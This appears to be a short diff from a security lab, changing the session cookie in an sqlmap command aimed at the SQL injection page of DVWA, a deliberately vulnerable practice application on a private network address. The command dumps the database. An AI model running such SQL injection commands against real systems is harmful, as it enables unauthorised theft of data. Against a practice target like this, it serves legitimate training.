@@ -1,5 +1,5 @@
 sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="security=low; PHPSESSID=7urmi49qup0njqoddkqthli32" \
+  --cookie="security=low; PHPSESSID=isqqnaj12ctdpqnsgqdv2l8tp9" \
   --headers="Referer: http://192.168.56.101/dvwa/vulnerabilities/sqli/" \
   --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" \
   --batch --dump --level=2 --risk=2 \
